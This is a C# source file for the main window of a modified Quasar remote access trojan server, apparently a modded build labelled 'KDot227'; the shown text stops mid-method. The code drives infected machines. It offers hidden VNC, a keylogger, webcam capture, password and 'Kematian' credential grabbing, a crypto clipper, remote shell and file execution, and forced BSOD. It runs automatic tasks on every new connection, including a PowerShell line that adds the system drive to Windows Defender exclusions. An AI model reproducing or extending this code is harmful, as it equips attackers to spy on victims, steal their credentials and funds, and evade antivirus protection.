﻿using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Common.Messages.Administration.Actions;
using Quasar.Common.Messages.ClientManagement;
using Quasar.Common.Messages.FunStuff;
using Quasar.Common.Messages.Preview;
using Quasar.Common.Messages.UserSupport.MessageBox;
using Quasar.Common.Messages.UserSupport.Website;
using Quasar.Server.Extensions;
using Quasar.Server.Forms.DarkMode;
using Quasar.Server.Messages;
using Quasar.Server.Models;
using Quasar.Server.Networking;
using Quasar.Server.Utilities;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Windows.Forms;
using Quasar.Common.Messages.QuickCommands;
using System.IO;

namespace Quasar.Server.Forms
{
    public partial class FrmMain : Form
    {
        public QuasarServer ListenServer { get; set; }

        private const int STATUS_ID = 4;
        private const int CURRENTWINDOW_ID = 5;
        private const int USERSTATUS_ID = 6;

        private bool _titleUpdateRunning;
        private bool _processingClientConnections;
        private readonly ClientStatusHandler _clientStatusHandler;
        private readonly GetCryptoAddress _getCryptoAddress;
        private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();
        private readonly object _processingClientConnectionsLock = new object();
        private readonly object _lockClients = new object(); // lock for clients-listview

        private PreviewHandler _previewImageHandler;

        public FrmMain()
        {
            _clientStatusHandler = new ClientStatusHandler();
            _getCryptoAddress = new GetCryptoAddress();
            RegisterMessageHandler();
            InitializeComponent();
            DarkModeManager.ApplyDarkMode(this);
        }


        private void OnAddressReceived(object sender, Client client, string addressType)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(() => OnAddressReceived(sender, client, addressType)));
                return;
            }
        }

        /// <summary>
        /// Registers the client status message handler for client communication.
        /// </summary>
        private void RegisterMessageHandler()
        {
            MessageHandler.Register(_clientStatusHandler);
            _clientStatusHandler.StatusUpdated += SetStatusByClient;
            _clientStatusHandler.UserStatusUpdated += SetUserStatusByClient;
            _clientStatusHandler.UserActiveWindowStatusUpdated += SetUserActiveWindowByClient;
            //MessageHandler.Register(new GetPreviewImageHandler());
            MessageHandler.Register(_getCryptoAddress);
            _getCryptoAddress.AddressReceived += OnAddressReceived;
        }

        /// <summary>
        /// Unregisters the client status message handler.
        /// </summary>
        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_clientStatusHandler);
            _clientStatusHandler.StatusUpdated -= SetStatusByClient;
            _clientStatusHandler.UserStatusUpdated -= SetUserStatusByClient;
            _clientStatusHandler.UserActiveWindowStatusUpdated -= SetUserActiveWindowByClient;
            MessageHandler.Unregister(_getCryptoAddress);
            _getCryptoAddress.AddressReceived -= OnAddressReceived;
        }

        public void UpdateWindowTitle()
        {
            if (_titleUpdateRunning) return;
            _titleUpdateRunning = true;
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    int selected = lstClients.SelectedItems.Count;
                    this.Text = (selected > 0)
                        ? string.Format("Quasar - Modded by KDot227 - Connected: {0} [Selected: {1}]", ListenServer.ConnectedClients.Length,
                            selected)
                        : string.Format("Quasar - Modded by KDot227 - Connected: {0}", ListenServer.ConnectedClients.Length);
                });
            }
            catch (Exception)
            {
            }
            _titleUpdateRunning = false;
        }

        private void InitializeServer()
        {
            X509Certificate2 serverCertificate;
#if DEBUG
            serverCertificate = new DummyCertificate();
#else
            if (!File.Exists(Settings.CertificatePath))
            {
                using (var certificateSelection = new FrmCertificate())
                {
                    while (certificateSelection.ShowDialog() != DialogResult.OK)
                    { }
                }
            }
            serverCertificate = new X509Certificate2(Settings.CertificatePath);
#endif
            /*var str = Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert));

            var cert2 = new X509Certificate2(Convert.FromBase64String(str));
            var serverCsp = (RSACryptoServiceProvider)serverCertificate.PublicKey.Key;
            var connectedCsp = (RSACryptoServiceProvider)new X509Certificate2(cert2).PublicKey.Key;

            var result = serverCsp.ExportParameters(false);
            var result2 = connectedCsp.ExportParameters(false);

            var b = SafeComparison.AreEqual(result.Exponent, result2.Exponent) &&
                    SafeComparison.AreEqual(result.Modulus, result2.Modulus);*/

            ListenServer = new QuasarServer(serverCertificate);
            ListenServer.ServerState += ServerState;
            ListenServer.ClientConnected += ClientConnected;
            ListenServer.ClientDisconnected += ClientDisconnected;
        }

        private void StartConnectionListener()
        {
            try
            {
                ListenServer.Listen(Settings.ListenPort, Settings.IPv6Support, Settings.UseUPnP);
            }
            catch (SocketException ex)
            {
                if (ex.ErrorCode == 10048)
                {
                    MessageBox.Show(this, "The port is already in use.", "Socket Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                else
                {
                    MessageBox.Show(this, $"An unexpected socket error occurred: {ex.Message}\n\nError Code: {ex.ErrorCode}\n\n", "Unexpected Socket Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                ListenServer.Disconnect();
            }
            catch (Exception)
            {
                ListenServer.Disconnect();
            }
        }

        private void AutostartListening()
        {
            if (Settings.AutoListen)
            {
                StartConnectionListener();
            }

            if (Settings.EnableNoIPUpdater)
            {
                NoIpUpdater.Start();
            }
        }

        public void EventLogVisability()
        {
            if (Settings.EventLog)
            {
                DebugLogRichBox.Visible = true;
                splitter1.Visible = true;
            } else
            {
                DebugLogRichBox.Visible = false;
                splitter1.Visible = false;
            }
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            EventLog("Welcome to Quasar Continuation.", "info");
            //SetEqualColumnWidths();
            InitializeServer();
            AutostartListening();
            EventLogVisability();
            notifyIcon.Visible = false;
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            ListenServer.Disconnect();
            UnregisterMessageHandler();
            if (_previewImageHandler != null)
            {
                MessageHandler.Unregister(_previewImageHandler);
                _previewImageHandler.Dispose();
            }
            notifyIcon.Visible = false;
            notifyIcon.Dispose();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        public void EventLog(string message, string level)
        {
            try
            {
                if (DebugLogRichBox.InvokeRequired)
                {
                    DebugLogRichBox.Invoke(new Action(() => LogMessage(message, level)));
                }
                else
                {
                    LogMessage(message, level);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error in EventLog: {ex.Message}");
            }
        }

        private void LogMessage(string message, string level)
        {
            try
            {
                string timestamp = DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss");
                string formattedMessage = $"[{timestamp}] {message}";
                System.Drawing.Color logColor = System.Drawing.Color.White;

                switch (level.ToLower())
                {
                    case "normal":
                        logColor = System.Drawing.Color.White;
                        break;
                    case "info":
                        logColor = System.Drawing.Color.DodgerBlue;
                        break;
                    case "error":
                        logColor = System.Drawing.Color.Red;
                        break;
                    default:
                        logColor = System.Drawing.Color.White;
                        break;
                }
                DebugLogRichBox.AppendText(formattedMessage + Environment.NewLine);
                DebugLogRichBox.SelectionStart = DebugLogRichBox.TextLength;
                DebugLogRichBox.SelectionLength = 0;
                DebugLogRichBox.SelectionColor = logColor;
                DebugLogRichBox.ScrollToCaret();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error in LogMessage: {ex.Message}");
            }
        }


        private void lstClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateWindowTitle();

            var selectedClients = GetSelectedClients();
            if (selectedClients.Length == 1)
            {
                if (_previewImageHandler != null)
                {
                    MessageHandler.Unregister(_previewImageHandler);
                    _previewImageHandler.Dispose();
                }

                _previewImageHandler = new PreviewHandler(selectedClients[0], pictureBoxMain, listView1);
                MessageHandler.Register(_previewImageHandler);

                GetPreviewImage image = new GetPreviewImage
                {
                    Quality = 20,
                    DisplayIndex = 0
                };

                Debug.WriteLine("sending message!!!!!!!!!!!!!!!!!!!!");

                selectedClients[0].Send(image);
                tableLayoutPanel1.Visible = true;
            }
            else if (selectedClients.Length == 0)
            {
                tableLayoutPanel1.Visible = false;
                pictureBoxMain.Image = Properties.Resources.no_previewbmp;

                listView1.Items.Clear();

                var cpuItem = new ListViewItem("CPU");
                cpuItem.SubItems.Add("N/A");
                listView1.Items.Add(cpuItem);

                var gpuItem = new ListViewItem("GPU");
                gpuItem.SubItems.Add("N/A");
                listView1.Items.Add(gpuItem);

                var ramItem = new ListViewItem("RAM");
                ramItem.SubItems.Add("0 GB");
                listView1.Items.Add(ramItem);

                var uptimeItem = new ListViewItem("Uptime");
                uptimeItem.SubItems.Add("N/A");
                listView1.Items.Add(uptimeItem);

                var antivirusItem = new ListViewItem("Antivirus");
                antivirusItem.SubItems.Add("N/A");
                listView1.Items.Add(antivirusItem);
            }
        }


        private void ServerState(Networking.Server server, bool listening, ushort port)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    if (!listening)
                        lstClients.Items.Clear();
                    listenToolStripStatusLabel.Text = listening ? string.Format("Listening on port {0}.", port) : "Not listening.";
                });
                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void ClientConnected(Client client)
        {
            lock (_clientConnections)
            {
                if (!ListenServer.Listening) return;
                _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, true));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }
            }

            UpdateConnectedClientsCount();
        }

        private void ClientDisconnected(Client client)
        {
            lock (_clientConnections)
            {
                if (!ListenServer.Listening) return;
                _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, false));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }
            }

            UpdateConnectedClientsCount();
        }

        private void UpdateConnectedClientsCount()
        {
            this.Invoke((MethodInvoker)delegate
            {
                connectedToolStripStatusLabel.Text = $"Connected: {ListenServer.ConnectedClients.Length}";
            });
        }

        private void ProcessClientConnections(object state)
        {
            while (true)
            {
                KeyValuePair<Client, bool> client;
                lock (_clientConnections)
                {
                    if (!ListenServer.Listening)
                    {
                        _clientConnections.Clear();
                    }

                    if (_clientConnections.Count == 0)
                    {
                        lock (_processingClientConnectionsLock)
                        {
                            _processingClientConnections = false;
                        }
                        return;
                    }

                    client = _clientConnections.Dequeue();
                }

                if (client.Key != null)
                {
                    switch (client.Value)
                    {
                        case true:
                            AddClientToListview(client.Key);
                            StartAutomatedTask(client.Key);
                            if (Settings.ShowPopup)
                                ShowPopup(client.Key);
                            break;
                        case false:
                            RemoveClientFromListview(client.Key);
                            break;
                    }
                }
            }
        }

        private void StartAutomatedTask(Client client)
        {
            if (lstTasks.InvokeRequired)
            {
                lstTasks.Invoke(new Action(() => StartAutomatedTask(client)));
                return;
            }

            foreach (ListViewItem item in lstTasks.Items)
            {
                string taskCaption = item.Text; // Get the caption of the item
                string subItem0 = item.SubItems.Count > 1 ? item.SubItems[1].Text : "N/A";
                string subItem1 = item.SubItems.Count > 2 ? item.SubItems[2].Text : "N/A";

                if (taskCaption == "Remote Execute")
                {
                    FileManagerHandler fileManagerHandler = new FileManagerHandler(client);
                    fileManagerHandler.BeginUploadFile(subItem0, "");
                }
                else if (taskCaption == "Shell Command")
                {
                    string Code = subItem1;
                    DoSendQuickCommand quickCommand = new DoSendQuickCommand { Command = Code, Host = subItem0 };
                    client.Send(quickCommand);
                }
                else if (taskCaption == "Kematian Recovery")
                {
                    var kematianHandler = new KematianHandler(client);
                    kematianHandler.RequestKematianZip();
                }
                else if (taskCaption == "Exclude System Drives")
                {
                    string powershellCode = "Add-MpPreference -ExclusionPath \"$([System.Environment]::GetEnvironmentVariable('SystemDrive'))\\\"\r\n";
                    DoSendQuickCommand quickCommand = new DoSendQuickCommand { Command = powershellCode, Host = "powershell.exe" };
                    bool isClientAdmin = client.Value.AccountType == "Admin" || client.Value.AccountType == "System";
                    if (isClientAdmin)
                    {
                        client.Send(quickCommand);
                    }
                    else
                    {

                    }
                }
                else if (taskCaption == "Message Box")
                {
                    client.Send(new DoShowMessageBox
                    {
                        Caption = subItem0,
                        Text = subItem1,
                        Button = "OK",
                        Icon = "None"
                    });
                }
            }
        }

        /// <summary>
        /// Sets the tooltip text of the listview item of a client.
        /// </summary>
        /// <param name="client">The client on which the change is performed.</param>
        /// <param name="text">The new tooltip text.</param>
        public void SetToolTipText(Client client, string text)
        {
            if (client == null) return;

            try
            {
                lstClients.Invoke((MethodInvoker)delegate
                {
                    var item = GetListViewItemByClient(client);
                    if (item != null)
                        item.ToolTipText = text;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Adds a connected client to the Listview.
        /// </summary>
        /// <param name="client">The client to add.</param>
        private void AddClientToListview(Client client)
        {
            if (client == null) return;

            try
            {
                // this " " leaves some space between the flag-icon and first item
                ListViewItem lvi = new ListViewItem(new string[]
                {
                    " " + client.EndPoint.Address, client.Value.Tag,
                    client.Value.UserAtPc, client.Value.Version, "Connected", "", "Active", client.Value.CountryWithCode,
                    client.Value.OperatingSystem, client.Value.AccountType
                })
                { Tag = client, ImageIndex = client.Value.ImageIndex };

                lstClients.Invoke((MethodInvoker)delegate
                {
                    lock (_lockClients)
                    {
                        lstClients.Items.Add(lvi);
                    }
                });
                EventLog(client.Value.UserAtPc + " Has connected.", "normal");
                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Removes a connected client from the Listview.
        /// </summary>
        /// <param name="client">The client to remove.</param>
        private void RemoveClientFromListview(Client client)
        {
            if (client == null) return;

            try
            {
                lstClients.Invoke((MethodInvoker)delegate
                {
                    lock (_lockClients)
                    {
                        foreach (ListViewItem lvi in lstClients.Items.Cast<ListViewItem>()
                            .Where(lvi => lvi != null && client.Equals(lvi.Tag)))
                        {
                            lvi.Remove();
                            break;
                        }
                    }
                });
                UpdateWindowTitle();
                EventLog(client.Value.UserAtPc + " Has disconnected.", "normal");
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Sets the status of a client.
        /// </summary>
        /// <param name="sender">The message handler which raised the event.</param>
        /// <param name="client">The client to update the status of.</param>
        /// <param name="text">The new status.</param>
        private void SetStatusByClient(object sender, Client client, string text)
        {
            var item = GetListViewItemByClient(client);
            if (item != null)
                item.SubItems[STATUS_ID].Text = text;
        }

        /// <summary>
        /// Sets the user status of a client.
        /// </summary>
        /// <param name="sender">The message handler which raised the event.</param>
        /// <param name="client">The client to update the user status of.</param>
        /// <param name="userStatus">The new user status.</param>
        private void SetUserStatusByClient(object sender, Client client, UserStatus userStatus)
        {
            var item = GetListViewItemByClient(client);
            if (item != null)
                item.SubItems[USERSTATUS_ID].Text = userStatus.ToString();

        }

        private void SetUserActiveWindowByClient(object sender, Client client, string newWindow)
        {
            var item = GetListViewItemByClient(client);
            if (item != null)
                item.SubItems[CURRENTWINDOW_ID].Text = newWindow;
        }

        /// <summary>
        /// Gets the Listview item which belongs to the client. 
        /// </summary>
        /// <param name="client">The client to get the Listview item of.</param>
        /// <returns>Listview item of the client.</returns>
        private ListViewItem GetListViewItemByClient(Client client)
        {
            if (client == null) return null;

            ListViewItem itemClient = null;

            lstClients.Invoke((MethodInvoker)delegate
            {
                itemClient = lstClients.Items.Cast<ListViewItem>()
                    .FirstOrDefault(lvi => lvi != null && client.Equals(lvi.Tag));
            });

            return itemClient;
        }

        /// <summary>
        /// Gets all selected clients.
        /// </summary>
        /// <returns>An array of all selected Clients.</returns>
        private Client[] GetSelectedClients()
        {
            List<Client> clients = new List<Client>();

            lstClients.Invoke((MethodInvoker)delegate
            {
                lock (_lockClients)
                {
                    if (lstClients.SelectedItems.Count == 0) return;
                    clients.AddRange(
                        lstClients.SelectedItems.Cast<ListViewItem>()
                            .Where(lvi => lvi != null)
                            .Select(lvi => lvi.Tag as Client));
                }
            });

            return clients.ToArray();
        }

        /// <summary>
        /// Displays a popup with information about a client.
        /// </summary>
        /// <param name="c">The client.</param>
        private void ShowPopup(Client c)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    if (c == null || c.Value == null) return;

                    notifyIcon.Visible = true; // Temporarily show the task tray icon
                    notifyIcon.ShowBalloonTip(4000, string.Format("Client connected from {0}!", c.Value.Country),
                        string.Format("IP Address: {0}\nOperating System: {1}", c.EndPoint.Address.ToString(),
                        c.Value.OperatingSystem), ToolTipIcon.Info);
                    notifyIcon.Visible = false; // Hide the task tray icon again
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        #region "ContextMenuStrip"

        #region "Client Management"

        private void elevateClientPermissionsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoAskElevate());
            }
        }

        private void updateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
                frmRe.Show();
            }
        }

        private void reconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoClientReconnect());
            }
        }

        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoClientDisconnect());
            }
        }

        private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count == 0) return;
            if (
                MessageBox.Show(
                    string.Format(
                        "Are you sure you want to uninstall the client on {0} computer\\s?",
                        lstClients.SelectedItems.Count), "Uninstall Confirmation", MessageBoxButtons.YesNo,
                    MessageBoxIcon.Question) == DialogResult.Yes)
            {
                foreach (Client c in GetSelectedClients())
                {
                    c.Send(new DoClientUninstall());
                }
            }
        }

        #endregion

        #region "Administration"

        private void systemInformationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmSystemInformation frmSi = FrmSystemInformation.CreateNewOrGetExisting(c);
                frmSi.Show();
                frmSi.Focus();
            }
        }

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmFileManager frmFm = FrmFileManager.CreateNewOrGetExisting(c);
                frmFm.Show();
                frmFm.Focus();
            }
        }

        private void startupManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmStartupManager frmStm = FrmStartupManager.CreateNewOrGetExisting(c);
                frmStm.Show();
                frmStm.Focus();
            }
        }

        private void taskManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmTaskManager frmTm = FrmTaskManager.CreateNewOrGetExisting(c);
                frmTm.Show();
                frmTm.Focus();
            }
        }

        private void remoteShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmRemoteShell frmRs = FrmRemoteShell.CreateNewOrGetExisting(c);
                frmRs.Show();
                frmRs.Focus();
            }
        }

        private void connectionsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmConnections frmCon = FrmConnections.CreateNewOrGetExisting(c);
                frmCon.Show();
                frmCon.Focus();
            }
        }

        private void reverseProxyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmReverseProxy frmRs = new FrmReverseProxy(clients);
                frmRs.Show();
            }
        }

        private void registryEditorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                foreach (Client c in GetSelectedClients())
                {
                    FrmRegistryEditor frmRe = FrmRegistryEditor.CreateNewOrGetExisting(c);
                    frmRe.Show();
                    frmRe.Focus();
                }
            }
        }

        private void localFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
                frmRe.Show();
            }
        }

        private void webFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
                frmRe.Show();
            }
        }

        private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction { Action = ShutdownAction.Shutdown });
            }
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction { Action = ShutdownAction.Restart });
            }
        }

        private void standbyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction { Action = ShutdownAction.Standby });
            }
        }

        #endregion

        #region "Monitoring"

        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmRd = FrmRemoteDesktop.CreateNewOrGetExisting(c);
                frmRd.Show();
                frmRd.Focus();
            }
        }

        private void hVNCToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmHvnc = FrmHVNC.CreateNewOrGetExisting(c);
                frmHvnc.Show();
                frmHvnc.Focus();
            }
        }

        private void passwordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmPasswordRecovery frmPass = new FrmPasswordRecovery(clients);
                frmPass.Show();
            }
        }

        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmKeylogger frmKl = FrmKeylogger.CreateNewOrGetExisting(c);
                frmKl.Show();
                frmKl.Focus();
            }
        }

        private void kematianGrabbingToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var kematianHandler = new KematianHandler(c);

                kematianHandler.RequestKematianZip();

                //kematianHandler.Dispose();
            }
        }

        private void webcamToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmWebcam = FrmRemoteWebcam.CreateNewOrGetExisting(c);
                frmWebcam.Show();
                frmWebcam.Focus();
            }
        }

        #endregion

        #region "User Support"

        private void visitWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmVisitWebsite(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            c.Send(new DoVisitWebsite
                            {
                                Url = frm.Url,
                                Hidden = frm.Hidden
                            });
                        }
                    }
                }
            }
        }

        private void showMessageboxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmShowMessagebox(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            c.Send(new DoShowMessageBox
                            {
                                Caption = frm.MsgBoxCaption,
                                Text = frm.MsgBoxText,
                                Button = frm.MsgBoxButton,
                                Icon = frm.MsgBoxIcon
                            });
                        }
                    }
                }
            }
        }

        #endregion

        #region "Quick Commands"

        private void addCDriveExceptionToolStripMenuItem_Click(object sender, EventArgs e)
        {

            string powershellCode = "Add-MpPreference -ExclusionPath C:\\";
            DoSendQuickCommand quickCommand = new DoSendQuickCommand { Command = powershellCode, Host = "powershell.exe" };

            foreach (Client c in GetSelectedClients())
            {
                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";

                if (isClientAdmin)
                {
                    c.Send(quickCommand);
                }
                else
                {
                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        #endregion

        #region "Fun Stuff"
        private void bSODToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoBSOD());
            }
        }

        private void swapMouseButtonsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoSwapMouseButtons());
            }
        }

        private void hideTaskBarToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoHideTaskbar());
            }
        }

        #endregion

        private void selectAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            lstClients.SelectAllItems();
        }

        #endregion

        #region "MenuStrip"

        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmSettings(ListenServer))
            {
                frm.ShowDialog();
            }
        }

        private void builderToolStripMenuItem_Click(object sender, EventArgs e)
        {
#if DEBUG
            MessageBox.Show("Client Builder is not available in DEBUG configuration.\nPlease build the project using RELEASE configuration.", "Not available", MessageBoxButtons.OK, MessageBoxIcon.Information);
#else
            using (var frm = new FrmBuilder())
            {
                frm.ShowDialog();
            }
#endif
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmAbout())
            {
                frm.ShowDialog();
            }
        }

        #endregion

        #region "NotifyIcon"

        private void notifyIcon_MouseDoubleClick(object sender, MouseEventArgs e)
        {
        }


        #endregion

        private void contextMenuStrip_Opening(object sender, System.ComponentModel.CancelEventArgs e)
        {

        }

        private void addKeywordsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmKeywords())
            {
                frm.ShowDialog();
            }
        }

        //Add Event to Notification Centre

        public static void AddNotiEvent(FrmMain frmMain, string Client, string Keywords, string WindowText)
        {
            if (frmMain.lstNoti.InvokeRequired)
            {
                frmMain.lstNoti.Invoke(new Action(() => AddNotiEvent(frmMain, Client, Keywords, WindowText)));
                return;
            }
            ListViewItem item = new ListViewItem(Client);
            item.SubItems.Add(DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss"));
            item.SubItems.Add(Keywords);
            while (item.SubItems.Count < 11)
            {
                item.SubItems.Add("");
            }
            item.SubItems[3].Text = WindowText;
            frmMain.lstNoti.Items.Add(item);
        }

        //Get Clients Username
        public static string GetClientsUsername(string ipAddress, FrmMain frmMain)
        {
            foreach (ListViewItem item in frmMain.lstClients.Items)
            {
                if (item.Text.Trim() == ipAddress.Trim())
                {
                    return item.SubItems[2].Text;
                }
            }
            return "Unknown";
        }

        private void clientsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MainTabControl.SelectTab(tabPage1);
        }

        private void notificationCentreToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MainTabControl.SelectTab(tabPage2);
        }

        private void clearSelectedToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstNoti.SelectedItems.Count > 0)
            {
                foreach (ListViewItem item in lstNoti.SelectedItems)
                {
                    lstNoti.Items.Remove(item);
                }
            }
            else
            {

            }
        }

        private void systemToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void deleteTasksToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstTasks.SelectedItems.Count > 0)
            {
                foreach (ListViewItem item in lstTasks.SelectedItems)
                {
                    lstTasks.Items.Remove(item);
                }
            }
            else
            {

            }
        }

        private void cryptoClipperToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MainTabControl.SelectTab(tabPage3);
        }

        private void autoTasksToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MainTabControl.SelectTab(tabPage4);
        }

        private void remoteExecuteToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmTaskExecute())
            {
                frm.ShowDialog();
            }
        }

        private void shellCommandToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmTaskCommand())
            {
                frm.ShowDialog();
            }
        }

        private void showMessageBoxToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmTaskMessageBox())
            {
                frm.ShowDialog();
            }
        }

        // add task to task Listview (lstTasks)
        public void AddTask(string title, string param1, string param2)
        {
            ListViewItem newItem = new ListViewItem(title);
            newItem.SubItems.Add(param1);
            newItem.SubItems.Add(param2);
            lstTasks.Items.Add(newItem);
        }

        private void kematianToolStripMenuItem_Click(object sender, EventArgs e)
        {
            AddTask("Kematian Recovery", "", "");
        }

        private void excludeSystemDriveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            AddTask("Exclude System Drives", "", "");
        }

        private void groupBox1_Enter(object sender, EventArgs e)
        {

        }

        private void ClipperCheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (ClipperCheckbox.Checked == true)
            {
                ClipperCheckbox.Text = "Stop";
            }
            else
            {
                ClipperCheckbox.Text = "Start";
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmFileManager frmFm = FrmFileManager.CreateNewOrGetExisting(c);
                frmFm.Show();
                frmFm.Focus();
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmRemoteShell frmRs = FrmRemoteShell.CreateNewOrGetExisting(c);
                frmRs.Show();
                frmRs.Focus();
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmRd = FrmRemoteDesktop.CreateNewOrGetExisting(c);
                frmRd.Show();
                frmRd.Focus();
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
                frmRe.Show();
            }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
